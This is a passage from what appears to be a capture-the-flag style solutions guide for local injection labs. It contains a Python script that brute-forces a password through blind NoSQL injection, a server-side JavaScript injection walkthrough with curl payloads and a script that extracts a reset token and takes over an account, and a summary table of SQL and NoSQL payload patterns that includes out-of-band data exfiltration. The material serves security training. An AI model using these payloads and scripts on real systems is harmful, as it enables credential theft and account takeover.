administrator' && this.password.length == 8 || 'a'=='b    → 200 ✅
```

Password length is **8**.

**Step 4 — Extract each character**

```
/user/lookup?user=administrator' && this.password[0] == 's' || 'a'=='b
```

200 → first character is `s`. 404 → wrong guess.

**Python automation script:**

```python
import requests

base = "http://localhost:5000"
session = requests.Session()

# Login as wiener
session.post(f"{base}/login", data={"username": "wiener", "password": "peter"})

charset = "abcdefghijklmnopqrstuvwxyz"
password = ""

for pos in range(8):
    for c in charset:
        payload = f"administrator' && this.password[{pos}] == '{c}' || 'a'=='b"
        r = session.get(f"{base}/user/lookup", params={"user": payload})
        if r.status_code == 200:
            password += c
            print(f"[+] Position {pos}: {c}  →  {password}")
            break

print(f"\n[✓] Password: {password}")
```

**Result:** Password is `security`

---

## Lab 24 — SSJI (Server-Side JavaScript Injection)

| Property | Value |
|----------|-------|
| **Type** | NoSQL Injection ($where + SSJI) |
| **Difficulty** | 🔴 Hard |
| **DB** | Simulated MongoDB |
| **Goal** | Enumerate hidden field names and extract a reset token to take over an account |

### Vulnerable Code

The `/login` endpoint accepts JSON with a `$where` field that is evaluated as JavaScript:
```json
{"username": "djamel", "password": {"$ne": ""}, "$where": "INJECTED_JS"}
```

The `$where` value is executed against each user document. The user `djamel` has a hidden field `resetToken` and their account is locked.

### Approach: Multi-phase SSJI attack

#### Phase 1 — Confirm $where injection works

**Step 1 — Bypass auth with $ne and $where: "1"**

```bash
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "djamel", "password": {"$ne": ""}, "$where": "1"}'
```
→ `{"message": "Account locked"}` (confirms injection works — we logged in as djamel)

```bash
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "djamel", "password": {"$ne": ""}, "$where": "0"}'
```
→ `{"message": "Invalid username or password"}` (condition was false)

#### Phase 2 — Enumerate hidden field names

**Step 2 — Use Object.keys() to discover field names**

We know some standard fields exist (`username`, `password`, `email`, `role`). We need to find the hidden one.

Test the field name at each index position:

```bash
# Check what key is at index 3 (0=username, 1=password, 2=email, 3=?)
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "djamel", "password": {"$ne": ""}, "$where": "Object.keys(this)[3].match('^resetToken')"}'
```

Test character by character to discover the field name:

```bash
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "djamel", "password": {"$ne": ""}, "$where": "Object.keys(this)[3].match('^.{0}r.*')"}'
```
→ `"Account locked"` = TRUE → first char is `r`

Continue for each position until you discover: `resetToken`.

#### Phase 3 — Extract the resetToken value

**Step 3 — Use this.resetToken.match() to extract value character by character**

```bash
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "djamel", "password": {"$ne": ""}, "$where": "this.resetToken.match('^.{0}a.*')"}'
```

**Python automation script:**

```python
import requests

url = "http://localhost:5000/login"
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
token = ""

for pos in range(8):
    for c in charset:
        payload = {
            "username": "djamel",
            "password": {"$ne": ""},
            "$where": f"this.resetToken.match('^.{{{pos}}}{c}.*')"
        }
        r = requests.post(url, json=payload)
        if "Account locked" in r.text:
            token += c
            print(f"[+] Position {pos}: {c}  →  {token}")
            break

print(f"\n[✓] Reset Token: {token}")
```

**Result:** resetToken is `a1b2c3d4`

#### Phase 4 — Use the token to reset the password

**Step 4 — Access the reset endpoint**

```
http://localhost:5000/forgot-password?resetToken=a1b2c3d4
```

This shows the password reset form.

**Step 5 — Reset djamel's password**

```bash
curl -X POST http://localhost:5000/reset \
  -d "token=a1b2c3d4&new_password=hacked123"
```

→ `"Password reset! You can now login."`

**Step 6 — Log in as djamel**

```bash
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "djamel", "password": "hacked123"}'
```

→ `{"message": "Login successful"}`

---

## 📝 Summary Table

| Lab | Type | Technique | Key Payload Pattern |
|-----|------|-----------|-------------------|
| 01 | In-Band | WHERE bypass | `' OR 1=1 #` |
| 02 | In-Band | Comment injection | `administrator' #` |
| 03 | UNION | Column count | `' UNION SELECT NULL, NULL #` |
| 04 | UNION | Schema enum | `' UNION SELECT table_name, NULL FROM information_schema.tables #` |
| 05 | UNION | Oracle syntax | `' UNION SELECT col, col FROM table FROM dual #` |
| 06 | UNION | Column count | `' UNION SELECT NULL, NULL, NULL #` |
| 07 | UNION | Type detection | `' UNION SELECT NULL, 'text', NULL #` |
| 08 | UNION | Data dump | `' UNION SELECT username, password FROM users #` |
| 09 | UNION | Concatenation | `' UNION SELECT NULL, CONCAT(user,':',pass) FROM users #` |
| 10 | Blind | Boolean-based | `' AND SUBSTRING((...),1,1)='a' #` |
| 11 | Blind | Conditional error | `' \|\| CASE WHEN (cond) THEN 1/0 ELSE '' END \|\| '` |
| 12 | Error | CAST leak | `' AND 1=CAST((SELECT ...) AS INT) --` |
| 13 | Time | pg_sleep | `' \|\| pg_sleep(5) --` |
| 14 | Time | Conditional sleep | `'; SELECT CASE WHEN (cond) THEN pg_sleep(3) END --` |
| 15 | OOB | Oracle XXE | `EXTRACTVALUE(xmltype('...SYSTEM "http://..."'))` |
| 16 | OOB | Data exfiltration | `SYSTEM "http://" \|\| (SELECT pass) \|\| ".domain"` |
| 17 | OOB | Callback trap | `http_exfil('url' \|\| (SELECT token))` |
| 18 | WAF | Filter bypass | Use `%09` (tab) instead of spaces |
| 19 | Auto | Header injection | SQLMap `--header="User-Agent: *"` |
| 20 | Auto | Mass extraction | SQLMap `--tables --dump` |
| 21 | NoSQLi | $where bypass | `Gifts'\|\|1\|\|'` |
| 22 | NoSQLi | Operator injection | `{"$ne": ""}` |
| 23 | NoSQLi | Blind regex | `' && this.password[0]=='a'` |
| 24 | NoSQLi | SSJI + enum | `Object.keys(this)[i].match('^...')` |

---

*🏴‍☠️ Happy Hacking!*
